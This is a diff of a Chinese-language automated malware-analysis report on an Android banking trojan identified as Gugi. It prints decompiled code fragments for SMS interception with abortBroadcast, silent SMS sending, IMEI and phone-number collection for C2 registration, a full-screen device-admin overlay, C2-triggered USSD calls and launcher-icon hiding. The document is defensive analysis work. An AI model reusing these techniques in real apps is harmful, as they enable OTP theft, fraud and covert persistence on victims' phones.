@@ -6,7 +6,7 @@
     "应用名": "System",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 221.3
+    "分析耗时(秒)": 553.2
   },
   "行为列表": [
     {
@@ -51,9 +51,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "public class Message {\n    private ArrayList<PendingIntent> deliveryIntents;\n    BroadcastReceiver deliveryReceiver;\n}",
-          "malicious_code_snippet_context": "  import ru.drink.lime.db.Notifications;\n  \n  /* loaded from: classes.dex */\n>>> public class Message {\n>>>     private Context ctx;\n>>>     private long date;\n>>>     private ArrayList<PendingIntent> deliveryIntents;\n      BroadcastReceiver deliveryReceiver;\n      private String description;\n      private int id;",
-          "behavior_description": "该类导入了SmsManager并定义了用于跟踪短信发送状态的PendingIntent和BroadcastReceiver，表明其具备静默发送短信的能力。在恶意样本背景下，通常用于后台向指定号码发送短信，可能导致用户扣费或作为C2通信手段。",
+          "malicious_code_snippet": "public class Message {\n    private Context ctx;\n    private ArrayList<PendingIntent> deliveryIntents;\n    BroadcastReceiver deliveryReceiver;\n}",
+          "malicious_code_snippet_context": "  import ru.drink.lime.db.Notifications;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> public class Message {\n>>>     private Context ctx;\n>>>     private long date;\n>>>     private ArrayList<PendingIntent> deliveryIntents;\n>>>     BroadcastReceiver deliveryReceiver;\n      private String description;\n      private int id;\n      private String message;",
+          "behavior_description": "该类是 Gugi 银行木马（Trojan-Banker.AndroidOS.Gugi）的短信发送模块。类中导入 android.telephony.SmsManager，并通过 ArrayList<PendingIntent> deliveryIntents 与 BroadcastReceiver deliveryReceiver 构建短信发送及送达回执监控机制，配合 ru.drink.lime.db.Notifications 数据库读取待发短信内容与目标号码。数据流向：C2 服务器（WebSocket 通道）下发短信指令 → 存入本地 Notifications 数据库 → Message 类读取内容与号码 → 调用 SmsManager.sendTextMessage()/sendMultipartTextMessage() 在用户无感知的情况下静默发送短信，典型用于增值业务扣费欺诈或配合短信拦截实施银行账户盗刷。",
           "glm_analyzed": true
         },
         {
@@ -62,9 +62,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "boolean block = new Settings(context).testFilter(phone);\nif (block) {\n    abortBroadcast();\n}\nMessage msg = new Message(body, phone, 0, context);\nMessages messages = new Messages(context);\nmessages.insert(msg);",
-          "malicious_code_snippet_context": "                  phone = mess[i].getOriginatingAddress();\n                  body = body + mess[i].getMessageBody();\n              }\n>>>             boolean block = new Settings(context).testFilter(phone);\n>>>             if (block) {\n>>>                 M.i(\"abortBroadcast!\");\n>>>                 abortBroadcast();\n>>>             }\n>>>             Message msg = new Message(body, phone, 0, context);\n>>>             Messages messages = new Messages(context);\n              messages.insert(msg);\n          }\n      }",
-          "behavior_description": "SmsReceiver接收到短信广播后，从PDU中解析出发送方号码(phone)和短信内容(body)，通过testFilter判断是否需要拦截，若需要则调用abortBroadcast()阻止短信到达用户收件箱，同时将拦截的短信内容存入本地数据库，实现短信静默拦截与窃取",
+          "malicious_code_snippet": "phone = mess[i].getOriginatingAddress();\nbody = body + mess[i].getMessageBody();\nboolean block = new Settings(context).testFilter(phone);\nif (block) {\n    abortBroadcast();\n}\nMessage msg = new Message(body, phone, 0, context);\nmessages.insert(msg);",
+          "malicious_code_snippet_context": "                  } else {\n                      mess[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);\n                  }\n>>>                 phone = mess[i].getOriginatingAddress();\n>>>                 body = body + mess[i].getMessageBody();\n>>>             }\n>>>             boolean block = new Settings(context).testFilter(phone);\n>>>             if (block) {\n>>>                 M.i(\"abortBroadcast!\");\n>>>                 abortBroadcast();\n>>>             }\n              Message msg = new Message(body, phone, 0, context);\n              Messages messages = new Messages(context);\n              messages.insert(msg);",
+          "behavior_description": "SmsReceiver 广播接收器监听短信到达广播，从 SMS PDU 中提取发送方号码和短信内容，通过 testFilter 按号码过滤（典型为银行/验证码短信号码）。若命中过滤规则，则调用 abortBroadcast() 终止广播，使系统默认短信应用和用户无法看到该短信（隐蔽拦截银行验证码/OTP），同时将拦截到的短信内容写入本地数据库（messages.insert），供后续上传至 C2 服务器。数据流向：短信广播 PDU（source）→ abortBroadcast 隐藏短信 + 本地存储窃取短信内容（sink），与厂商报告确认的 Gugi 银行木马短信拦截行为一致。",
           "glm_analyzed": true
         }
       ]
@@ -90,9 +90,9 @@
           "malicious_behavior": "device_fingerprinting",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "String imei = telephonyManager.getDeviceId();\nString operatorName = telephonyManager.getSimOperatorName();\nString phone = telephonyManager.getLine1Number();\nString country = telephonyManager.getSimCountryIso();\nString operatorMnc = telephonyManager.getNetworkOperator();\nobj.put(\"imei\", imei);",
-          "malicious_code_snippet_context": "          TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Messages.COLUMN_PHONE);\n          JSONObject obj = new JSONObject();\n          try {\n>>>             String imei = telephonyManager.getDeviceId();\n>>>             String clientSdkVersion = Build.VERSION.RELEASE;\n>>>             String operatorName = telephonyManager.getSimOperatorName();\n>>>             String phone = telephonyManager.getLine1Number();\n>>>             String country = telephonyManager.getSimCountryIso();\n>>>             String operatorMnc = telephonyManager.getNetworkOperator();\n              int mcc = Integer.parseInt(operatorMnc.substring(0, 3));\n              M.e(\"registration() :: clientSdkVersion: \" + clientSdkVersion);\n              obj.put(\"imei\", imei);",
-          "behavior_description": "代码通过 TelephonyManager 获取设备的 IMEI、SIM卡运营商名称、手机号码、SIM卡国家代码和网络运营商等敏感设备信息，并将其封装入 JSONObject 中，准备通过 socket.emit 发送到远程服务器，造成用户核心隐私泄露。",
+          "malicious_code_snippet": "TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Messages.COLUMN_PHONE);\nJSONObject obj = new JSONObject();\nString imei = telephonyManager.getDeviceId();\nString operatorName = telephonyManager.getSimOperatorName();\nString phone = telephonyManager.getLine1Number();\nString country = telephonyManager.getSimCountryIso();\nString operatorMnc = telephonyManager.getNetworkOperator();\nobj.put(\"imei\", imei);\nobj.put(\"client_version\", Constants.VERSION);\nobj.put(\"client_sdk_version\", clientSdkVersion);",
+          "malicious_code_snippet_context": "      \tat jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:94)\n       */\n      public void registration() {\n>>>         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Messages.COLUMN_PHONE);\n>>>         JSONObject obj = new JSONObject();\n>>>         try {\n>>>             String imei = telephonyManager.getDeviceId();\n>>>             String clientSdkVersion = Build.VERSION.RELEASE;\n>>>             String operatorName = telephonyManager.getSimOperatorName();\n>>>             String phone = telephonyManager.getLine1Number();\n>>>             String country = telephonyManager.getSimCountryIso();\n>>>             String operatorMnc = telephonyManager.getNetworkOperator();\n>>>             int mcc = Integer.parseInt(operatorMnc.substring(0, 3));\n              M.e(\"registration() :: clientSdkVersion: \" + clientSdkVersion);\n              obj.put(\"imei\", imei);\n              obj.put(\"client_version\", Constants.VERSION);",
+          "behavior_description": "该代码位于 SocketService（Gugi 银行木马用于 WebSocket C2 通信的服务组件）的 registration() 方法中。代码通过 TelephonyManager 采集设备敏感标识与网络信息，包括设备 IMEI（getDeviceId）、SIM 运营商名称（getSimOperatorName）、本机手机号（getLine1Number）、SIM 国家码（getSimCountryIso）、网络运营商 MCC/MNC（getNetworkOperator）以及系统版本（Build.VERSION.RELEASE），随后将上述设备指纹字段封装为 JSON 对象（imei、client_version、client_sdk_version 等），用于向 C2 服务器注册受感染设备，使攻击者能够唯一标识、追踪受害者并后续下发指令。数据流向：TelephonyManager.getDeviceId()/getLine1Number()/getSimOperatorName() 等敏感 API → JSONObject 封装 → 经 WebSocket 上报 C2 服务器（设备注册/指纹回传）。",
           "glm_analyzed": true
         }
       ]
@@ -124,9 +124,9 @@
           "malicious_behavior": "persistence",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "Notification.Builder builder = new Notification.Builder(this.ctx);\nbuilder.setContentIntent(null).setSmallIcon(R.drawable.ic_stat_action_info).setTicker(getResources().getText(R.string.admin_notify_title)).setContentTitle(getResources().getText(R.string.admin_notify_title)).setOngoing(false).setWhen(System.currentTimeMillis()).setSound(null).setVibrate(null).setContentText(getResources().getText(R.string.admin_notify_body));\nif (Build.VERSION.SDK_INT < 16) {\n    notify = builder.getNotification();\n} else {\n    notify = builder.build();\n}\nstartForeground(1, notify);\nWindowManager.LayoutParams params = Utils.getParams(-1, -1, true, 8388627);\nthis.view = inflate.inflate(R.layout.activity_admin, (ViewGroup) null);\nthis.windowManager.addView(this.view, params);",
-          "malicious_code_snippet_context": "          if (this.view == null) {\n              show();\n          }\n>>>         Notification.Builder builder = new Notification.Builder(this.ctx);\n>>>         builder.setContentIntent(null).setSmallIcon(R.drawable.ic_stat_action_info).setLargeIcon(BitmapFactory.decodeResource(this.ctx.getResources(), R.drawable.ic_stat_action_info)).setTicker(getResources().getText(R.string.admin_notify_title)).setContentTitle(getResources().getText(R.string.admin_notify_title)).setOngoing(false).setWhen(System.currentTimeMillis()).setSound(null).setVibrate(null).setContentText(getResources().getText(R.string.admin_notify_body));\n>>>         if (Build.VERSION.SDK_INT < 16) {\n>>>             notify = builder.getNotification();\n>>>         } else {\n>>>             notify = builder.build();\n>>>         }\n>>>         startForeground(1, notify);\n>>>         return 1;\n>>>     }\n>>> \n      /* JADX INFO: Access modifiers changed from: private */\n      public void show() {\n          WindowManager.LayoutParams params = Utils.getParams(-1, -1, true, 8388627);",
-          "behavior_description": "该代码通过 startForeground() 启动前台服务实现持久化保活，同时利用 WindowManager.addView() 以全屏参数(-1,-1)叠加一个 activity_admin 布局视图覆盖屏幕。通知设置为静默(无声音、无振动)、非持续(setOngoing(false))，隐蔽地维持服务运行。结合类名 AdminService 和布局中的 btnActivate 按钮，这是典型的勒索软件锁屏保活机制，通过前台服务确保锁屏界面持续覆盖用户设备，阻止正常使用。",
+          "malicious_code_snippet": "WindowManager.LayoutParams params = Utils.getParams(-1, -1, true, 8388627);\nthis.view = inflate.inflate(R.layout.activity_admin, (ViewGroup) null);\nthis.windowManager.addView(this.view, params);\nthis.view.findViewById(R.id.btnActivate).setOnClickListener(...);\nstartForeground(1, notify);",
+          "malicious_code_snippet_context": "  \n      /* JADX INFO: Access modifiers changed from: private */\n      public void show() {\n>>>         WindowManager.LayoutParams params = Utils.getParams(-1, -1, true, 8388627);\n>>>         LayoutInflater inflate = (LayoutInflater) this.ctx.getSystemService(\"layout_inflater\");\n>>>         this.view = inflate.inflate(R.layout.activity_admin, (ViewGroup) null);\n>>>         this.windowManager.addView(this.view, params);\n>>>         this.view.findViewById(R.id.btnActivate).setOnClickListener(new View.OnClickListener() { // from class: ru.drink.lime.AdminService.2\n              @Override // android.view.View.OnClickListener\n              public void onClick(View v) {\n                  if (AdminService.this.isAdmin()) {",
+          "behavior_description": "该代码属于Gugi银行木马（Trojan-Banker.AndroidOS.Gugi）的AdminService。数据流向：服务启动→构建通知→调用startForeground(1, notify)将自身提升为前台服务实现进程保活，防止被系统杀死；同时show()方法通过WindowManager以系统级窗口类型（8388627，覆盖于所有应用之上）添加全屏悬浮窗，展示伪造的'设备管理员激活'界面（activity_admin布局），诱导/胁迫用户点击btnActivate激活设备管理员权限。前台服务保活与全屏覆盖窗结合，使木马持续驻留并阻断用户正常操作，激活设备管理器后进一步阻止卸载，是Gugi木马持久化与提权的典型手法。",
           "glm_analyzed": true
         }
       ]
@@ -159,9 +159,9 @@
           "malicious_behavior": "call_operations",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "String phone = data.optString(Messages.COLUMN_PHONE);\nIntent callIntent = new Intent(\"android.intent.action.CALL\", Utils.ussdToCallableUri(phone));\ncallIntent.addFlags(268435456);\nSocketService.this.startActivity(callIntent);",
-          "malicious_code_snippet_context": "                  int id = data.optInt(\"id\");\n                  int type = data.optInt(\"type\");\n                  String body = data.optString(Notifications.COLUMN_BODY);\n>>>                 String phone = data.optString(Messages.COLUMN_PHONE);\n>>>                 Message msg = new Message(id, body, phone, BuildConfig.FLAVOR, 0L, type, SocketService.this.ctx);\n>>>                 msg.sendSms();\n>>>             }\n          });\n          this.socket.on(\"make_ussd\", new Emitter.Listener() { // from class: ru.drink.lime.SocketService.14\n              @Override // io.socket.emitter.Emitter.Listener",
-          "behavior_description": "恶意软件通过Socket连接接收远程C2服务器下发的'make_ussd'指令，从JSON数据中提取phone字段，构造ACTION_CALL Intent并调用startActivity()直接发起USSD通话。ACTION_CALL会绕过用户确认直接拨号，攻击者可远程控制设备拨打付费号码或执行USSD代码，导致用户经济损失。",
+          "malicious_code_snippet": "this.socket.on(\"make_ussd\", new Emitter.Listener() {\n    public void call(Object... args) {\n        JSONObject data = (JSONObject) args[0];\n        String phone = data.optString(\"phone\");\n        Intent callIntent = new Intent(\"android.intent.action.CALL\", Utils.ussdToCallableUri(phone));\n        callIntent.addFlags(268435456);\n        SocketService.this.startActivity(callIntent);\n    }\n});",
+          "malicious_code_snippet_context": "                  msg.sendSms();\n              }\n          });\n>>>         this.socket.on(\"make_ussd\", new Emitter.Listener() { // from class: ru.drink.lime.SocketService.14\n>>>             @Override // io.socket.emitter.Emitter.Listener\n>>>             public void call(Object... args) {\n>>>                 M.d(\"Socket: make_ussd\");\n>>>                 JSONObject data = (JSONObject) args[0];\n>>>                 int id = data.optInt(\"id\");\n>>>                 String phone = data.optString(Messages.COLUMN_PHONE);\n>>>                 Intent callIntent = new Intent(\"android.intent.action.CALL\", Utils.ussdToCallableUri(phone));\n>>>                 callIntent.addFlags(268435456);\n                  try {\n                      SocketService.this.startActivity(callIntent);\n                      String body = id + \"-1\";",
+          "behavior_description": "该代码是Gugi银行木马（Trojan-Banker.AndroidOS.Gugi）的远程控制模块。恶意程序通过WebSocket长连接监听C2服务器下发的'make_ussd'指令，从指令JSON数据中提取远程指定的电话号码/USSD代码，使用ACTION_CALL（而非需要用户确认的ACTION_DIAL）直接发起拨号/USSD请求，无需用户交互即可执行。执行成功或失败的结果（id-1/id-0）还会通过Notifications写回并回传给C2服务器形成闭环控制。数据流向：WebSocket C2指令（source）→ 解析JSON中的phone字段 → ussdToCallableUri转换 → ACTION_CALL直接拨号（sink）。攻击者可利用该功能执行USSD银行转账指令，直接窃取用户资金，是典型的银行木马恶意行为。",
           "glm_analyzed": true
         }
       ]
@@ -184,10 +184,10 @@
           "method_signature": "onCreate(Bundle savedInstanceState)",
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
-          "risk_level": "中",
+          "risk_level": "高",
           "malicious_code_snippet": "PackageManager p = getPackageManager();\nComponentName componentName = new ComponentName(getPackageName(), getClass().getName());\np.setComponentEnabledSetting(componentName, 2, 1);\nfinish();",
           "malicious_code_snippet_context": "          super.onCreate(savedInstanceState);\n          this.app = (Application) getApplication();\n          this.settings = new Settings(this);\n>>>         PackageManager p = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(getPackageName(), getClass().getName());\n>>>         p.setComponentEnabledSetting(componentName, 2, 1);\n>>>         finish();\n      }\n  }",
-          "behavior_description": "在 MainActivity.onCreate() 中，通过 getPackageManager() 获取 PackageManager 实例，构造当前 Activity 的 ComponentName，调用 setComponentEnabledSetting() 将自身组件状态设为 DISABLED（参数值2），随后立即调用 finish() 关闭 Activity。这使得应用启动后图标从启动器中消失，用户无法通过常规方式找到并卸载应用，是恶意软件常用的隐蔽驻留手法。",
+          "behavior_description": "在 MainActivity.onCreate 中，应用启动后立即通过 PackageManager.setComponentEnabledSetting 将自身 Activity 组件设置为禁用状态（参数 2 即 COMPONENT_ENABLED_STATE_DISABLED，参数 1 即 DONT_KILL_APP），使应用图标从桌面启动器中消失，随后调用 finish() 关闭界面，用户无感知。数据流向：getPackageManager()/getPackageName()/getClass().getName() 获取当前组件信息（source）→ setComponentEnabledSetting() 禁用组件实现图标隐藏（sink）。这是 Gugi 银行木马典型的隐蔽驻留手法，使用户无法在桌面上发现并卸载该应用，为后续短信拦截和银行欺诈行为提供掩护。",
           "glm_analyzed": true
         }
       ]
@@ -200,7 +200,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
